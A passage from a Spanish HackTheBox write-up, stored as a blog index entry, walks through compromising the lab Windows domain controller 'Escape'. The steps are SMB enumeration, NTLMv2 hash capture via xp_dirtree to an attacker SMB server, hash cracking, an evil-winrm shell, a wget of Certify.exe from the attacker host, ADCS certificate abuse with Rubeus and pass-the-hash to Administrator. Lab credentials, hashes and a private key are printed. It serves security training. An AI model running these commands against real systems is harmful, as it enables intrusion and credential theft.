[
  
  {
    "title": "Escape WriteUp",
    "url": "/posts/escape-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "windows, hackthebox, writeup, medium, certify, rubeus, DC, smbclient, evil-winrm",
    "date": "2023-04-02 18:00:00 +0200",
    





    "snippet": "Máquinita Windows de HackTheBox, es de dificultad media. Ganarameos acceso al servicio MSSQL tramitando una petición a un servidor nuestro SMB obtendremos el hash NTLMv2 de un usuario, nos conectamos por Evil-Winrm y mediante una contraseña lekeada vemos la contraseña de otro usuario, Para la esclada nos apovecharemos de un certificado vulnerable que nos dará el hash NTLMdel usuario Administrator.EnumeraciónEscaneo de puertosSi realizamos un NMAP Scan, veremos los siguientes puertos.❯❯ nmap 10.10.11.202Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 20:37 -04Nmap scan report for sequel.htb (10.10.11.202)Host is up (0.16s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE53/tcp   open  domain88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl1433/tcp open  ms-sql-s3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPsslNmap done: 1 IP address (1 host up) scanned in 26.54 secondsLos puertos 53 y 88  los que nos da a entender que es un dominio.Si realizamos un escaneo más profundo vemos.❯ nmap 10.10.11.202 -sCV -PnStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 20:40 -04Nmap scan report for sequel.htb (10.10.11.202)Host is up (0.16s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-04 08:41:00Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after:  2023-11-18T21:20:35|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m57s from scanner time.445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after:  2023-11-18T21:20:35|_ssl-date: 2023-04-04T08:42:24+00:00; +7h59m57s from scanner time.1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m57s from scanner time.| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-04-04T00:27:54|_Not valid after:  2053-04-04T00:27:54|_ms-sql-info: ERROR: Script execution failed (use -d to debug)|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m57s from scanner time.| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after:  2023-11-18T21:20:353269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m58s from scanner time.| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after:  2023-11-18T21:20:35Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m56s| smb2-security-mode: |   311: |_    Message signing enabled and required| smb2-time: |   date: 2023-04-04T08:41:45|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 104.34 secondsAadimos los domonios al etc/hostsecho '10.10.11.202      sequel.htb dc.sequel.htb' | tee -a /etc/hostsSi enumeramos con SMBCLIENT vemos lo siguiente.❯ smbclient -L 10.10.11.202 -N\tSharename       Type      Comment\t---------       ----      -------\tADMIN$          Disk      Remote Admin\tC$              Disk      Default share\tIPC$            IPC       Remote IPC\tNETLOGON        Disk      Logon server share \tPublic          Disk      \tSYSVOL          Disk      Logon server share SMB1 disabled -- no workgroup available  -L significa que queremos listar los archivos compartidos a nivel de sistema.  -N que queremos ver si está habilitada una Null Sesion.Como vemos el recurso Publicprocedemos a ver su contenido.❯ smbclient //10.10.11.202/Public  -NTry \"help\" to get a list of possible commands.smb: \\&gt; dir  .                                   D        0  Sat Nov 19 07:51:25 2022  ..                                  D        0  Sat Nov 19 07:51:25 2022  SQL Server Procedures.pdf           A    49551  Fri Nov 18 09:39:43 2022\t\t5184255 blocks of size 4096. 1455347 blocks availablesmb: \\&gt; get \"SQL Server Procedures.pdf\"getting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (49,5 KiloBytes/sec) (average 49,5 KiloBytes/sec)smb: \\&gt; Si lo abrimos en nuestro navegador, veremos lo siguiente:PDFPDFSi observamos se lekea un usuario y su contraseña del servicio MSSQL. Nos podemos conectar.❯ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL&gt; IntrusiónNos creamos un servidor SMB y le damos soporte para SMBv2❯ impacket-smbserver pwned  . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedUsando xp_dirtree realizamos una petición a nuestro servidor para capturar el hash NTLMv2.SQL&gt; xp_dirtree '\\\\10.10.14.15\\pwned'subdirectory                                                                                                                                                                                                                                                      depth   ❯ impacket-smbserver pwned  . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.11.202,65510)[*] AUTHENTICATE_MESSAGE (sequel\\sql_svc,DC)[*] User DC\\sql_svc authenticated successfully[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:314ff337fa86f59b92de0736deb4049c:010100000000000080000d6d9166d901c8ab9cfbb6ab467600000000010010006d006a00500063004c00410049005900030010006d006a00500063004c0041004900590002001000780067006500580056004d007a00740004001000780067006500580056004d007a0074000700080080000d6d9166d90106000400020000000800300030000000000000000000000000300000119db20e63db55f605fba008935acc2ecdc9bceb177eedfc45245d776a2b79350a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310035000000000000000000[*] Closing down connection (10.10.11.202,65510)[*] Remaining connections []Mediante Crack de Hash, obtenemos la contraseña.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusREGGIE1234ronnie (sql_svc)1g 0:00:00:07 DONE (2023-04-03 21:07) 0.1303g/s 1395Kp/s 1395Kc/s 1395KC/s RENZOJAVIER..REDMAN69Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completedUsando rpcclient podemos enumerar usuarios del dominio.❯ rpcclient -U 'sql_svc' 10.10.11.202Password for [WORKGROUP\\sql_svc]:rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[Tom.Henn] rid:[0x44f]user:[Brandon.Brown] rid:[0x450]user:[Ryan.Cooper] rid:[0x451]user:[sql_svc] rid:[0x452]user:[James.Roberts] rid:[0x453]user:[Nicole.Thompson] rid:[0x454]rpcclient $&gt; Nos conectamos mediante Evil-WinRm.❯ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnieEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents&gt; Si vamos a la raíz de C:, vemos……Evil-WinRM PS C:\\Users\\sql_svc\\Documents&gt; cd ../../../Evil-WinRM PS C:&gt; dirDirectory: C:\\Mode                LastWriteTime         Length Name----                -------------         ------ ----d-----         2/1/2023   8:15 PM                PerfLogsd-r---         2/6/2023  12:08 PM                Program Filesd-----       11/19/2022   3:51 AM                Program Files (x86)d-----       11/19/2022   3:51 AM                Publicd-----         2/1/2023   1:02 PM                SQLServerd-r---         2/1/2023   1:55 PM                Usersd-----         4/3/2023  10:34 PM                Windows*Evil-WinRM* PS C:\\&gt; Una carpeta llamada SQLServer y otra Logs.*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; dir    Directory: C:\\SQLServer\\LogsMode                LastWriteTime         Length Name----                -------------         ------ -----a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; Vemos que tenemos otro usuario y su contraseña.ERROLOG.BAKNos conectamos.❯ evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3Evil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; Procedemos a leer la primera flag.*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; type ../Desktop/user.txt12****************************a6*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; PwnedEscalada de PrivilegiosImportamos y ejecutamos Certify.exe para descubrir plantillas de certificados vulnerables. Todo lo descargaremos de este repositorio de GitHub.*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; wget http://10.10.14.15/Certify.exe -o Certify.exe*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; .\\Certify.exe find /vulnerable /currentuser   _____          _   _  __  / ____|        | | (_)/ _| | |     ___ _ __| |_ _| |_ _   _ | |    / _ \\ '__| __| |  _| | | | | |___|  __/ |  | |_| | | | |_| |  \\_____\\___|_|   \\__|_|_|  \\__, |                             __/ |                            |___./  v1.0.0[*] Action: Find certificate templates[*] Using current user's unrolled group SIDs for vulnerability checks.[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'[*] Listing info about the Enterprise CA 'sequel-DC-CA'    Enterprise CA Name            : sequel-DC-CA    DNS Hostname                  : dc.sequel.htb    FullName                      : dc.sequel.htb\\sequel-DC-CA    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101    Cert Start Date               : 11/18/2022 12:58:46 PM    Cert End Date                 : 11/18/2121 1:08:46 PM    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb    UserSpecifiedSAN              : Disabled    CA Permissions                :      Owner: BUILTIN\\Administrators        S-1-5-32-544      Access Rights                                     Principal      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544      Allow  ManageCA, ManageCertificates               sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512      Allow  ManageCA, ManageCertificates               sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519    Enrollment Agent Restrictions : None[!] Vulnerable Certificates Templates :    CA Name                               : dc.sequel.htb\\sequel-DC-CA    Template Name                         : UserAuthentication    Schema Version                        : 2    Validity Period                       : 10 years    Renewal Period                        : 6 weeks    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS    Authorized Signatures Required        : 0    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email    Permissions      Enrollment Permissions        Enrollment Rights           : sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512                                      sequel\\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519      Object Control Permissions        Owner                       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500        WriteOwner Principals       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519        WriteDacl Principals        : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519        WriteProperty Principals    : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519Certify completed in 00:00:10.0967993*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; Usando esta guía.certify.exe request /ca:&lt;$certificateAuthorityHost&gt; /template:&lt;$vulnerableCertificateTemplateName&gt; /altname:&lt;$adUserToImpersonate&gt;  /ca - Especificamos el servidor de la Autoridad de Certificación al que enviamos la solicitud;  /template - Especificamos la plantilla de certificado que debe utilizarse para generar el nuevo certificado;  /altname - Especificamos el usuario AD para el que debe generarse el nuevo certificado.```bashEvil-WinRM PS C:\\Users\\Ryan.Cooper\\Documents&gt; .\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:Administrator/ __|        | | ()/ _| | |     __ _ __| |_ | | _   _ | |    / _ \\ ‘| | |  | | | | | ||  / |  | || | | | || |  __||   _|||  _, |                             / |                            |./  v1.0.0[*] Action: Request a Certificates[] Current user context    : sequel\\Ryan.Cooper[] No subject name specified, using current context as subject.[] Template                : UserAuthentication[] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb[*] AltName                 : Administrator[*] Certificate Authority   : dc.sequel.htb\\sequel-DC-CA[] CA Response             : The certificate had been issued.[] Request ID              : 15[*] cert.pem         :—–BEGIN RSA PRIVATE KEY—–MIIEpAIBAAKCAQEAuQ0JwtjXqi8KxN4BpNub59Zm/VWwObmc7Fl81iWzpJR83hJfoPJw5NeORh91QJ+mlu1jxUg0J291PAYFgvTnBu/FqxkB3bhzEYlZTHSp5ds5WqR3jSlFOhVEE0UyAcmxBhxzZWGIvem/I3an3g23n02CQenEOTxlNlnYX0bZcYwbs/aoDUak9oZxTDNk4mbp3H7jcdjnw29NnjCIbuq/2tocbL98p4Wn+9YHkmOMmUk38Wqg2YQjbC60KBj9Ww+D1a8yNHyLXP3e7loC6zi7XUGjZeNhWb5x9yHXeFiGvsHvl9Ik/6mqFa1yoclEPS696e74nqOTEyVXMQRkpKYiHQIDAQABAoIBAQCCkzSkDKaBK5iJua2nSl8EhEE/2Ur0MIkOLUbtRMUyCKTjfkuEIg6PK5r02BXAd+bw8KlJ99z1RqyOoiEZev3Z4y6zwH2UmiZ35VbhoCCSVNJvp0XEka6LgZ37iwPyRwNmsISssNnwSBPbTkq9YSiEfAjBwdX4HSm95D/NWwzsFSDxRJviQgwL5VOObtqmkaN3l96x2r1euL5d5YYtnOvgZnnAjHTMG0KVSnQRXJvyoMDptGi5Tk6xRGj+rlLjVZv+D/zbg4Q0smWWxHmTimYUm8nxDtO0G0Lakg31iKM9l8SHdDUoWexObVUhRjLePnMubjht8/W+Gr8M7c/1QLTxAoGBAOxfL9gOT72pJ7Vytr1s0HUJgZ4rqFzDyAcFweOSbPY3VHsO2SweH+y4LEXKbva6PoasorF/jMCAW3aBARlyz7ge3I1MI+Q3bGp625lkRQ6IQsDhJLgqjRRMVVEAkQSmPaDYji70jbtEKOA5WBeFPrNyPBfxNk6APfzg9KkFVEdnAoGBAMhq3f2Bxu2aMzmadBQhnkip1BI5XFMlFhNL8w+p67ixFTfs3hHeI9FcQjqeY3ND7FvID92PjwvxuGP3QZmKW76VvZ0pAMRrTjb/Kbvg4FtqirqALdEMY51zxHv5ZHqCp9uxu1U2cuiYHPF0iT5onNcXCPSVWtL3efU61+Heg2vbAoGBAND+ULU94i+V0vBSH1VZUu9ImnyZqWFsEf5zjr2CiCkjPuUXednSQPPy2+JRXM92WTaGictbNb43P6eF5Mz1gMgRMX0VZ16vyoJTYrs7tvtka3FTID5eESNzYrQeRhrQSglfsEfAH1kGqQWobkVNoOTVCmE4+4VpSmW/GVQgzCXdAoGACvm3QHvL7hUkuwHXW4bfyTDruTfE85SzWckt/WybyRiBhfeFzcqxgXSg997WqWhN2FTjcYm8FrZdF7RhtkvabFx87s9hCGCr/t0IZw6QmtEB2ebNG4anKec+Gl/0/bSMBr77+FWsA0rZQuvT3EQUWr8bMXHAcI828ZQQYIE0B0MCgYBMNfQ+9fiFnWALqU73ehVc0kPvJznmSXX0Z+XIHjbqpzQs9bQ7h6WqHNzaZVaueOrv9QJ+TvEKAfkUbbpoV+v2OwVckjqGCwf5SbkhHfx1j4tYNRauH7Hf2r23b/ZRy23efeU/ZYZs2YY71K6fURET7hrgFG020HRn+NxGJHEA5g==—–END RSA PRIVATE KEY—–—–BEGIN CERTIFICATE—–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—–END CERTIFICATE—–[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out cert.pfxCertify completed in 00:00:12.8384593Evil-WinRM PS C:\\Users\\Ryan.Cooper\\Documents&gt;En nuestro Linux guardamos la información en un archivo llamado `cert.perm` y hacemos lo siguiente.```bash❯ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfxEnter Export Password:Verifying - Enter Export Password:Descargamos el archivo y el binario de Rubeus.*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; .\\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials   ______        _  (_____ \\      | |   _____) )_   _| |__  _____ _   _  ___  |  __  /| | | |  _ \\| ___ | | | |/___)  | |  \\ \\| |_| | |_) ) ____| |_| |___ |  |_|   |_|____/|____/|_____)____/(___/  v2.2.0[*] Action: Ask TGT[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\\Administrator'[*] Using domain controller: fe80::ac1b:a74a:c865:d5a0%4:88[+] TGT request successful![*] base64(ticket.kirbi):      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  ServiceName              :  krbtgt/sequel.htb  ServiceRealm             :  SEQUEL.HTB  UserName                 :  Administrator  UserRealm                :  SEQUEL.HTB  StartTime                :  4/4/2023 7:47:55 PM  EndTime                  :  4/5/2023 5:47:55 AM  RenewTill                :  4/11/2023 7:47:55 PM  Flags                    :  name_canonicalize, pre_authent, initial, renewable  KeyType                  :  rc4_hmac  Base64(key)              :  RJRD36btjbbDzaug9HCMbQ==  ASREP (key)              :  D7DB92B28474C13C0F2172CE2F52A8F5[*] Getting credentials using U2U  CredentialInfo         :    Version              : 0    EncryptionType       : rc4_hmac    CredentialData       :      CredentialCount    : 1       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; Nos conectamos usando el hash NTLM❯ evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EEEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS 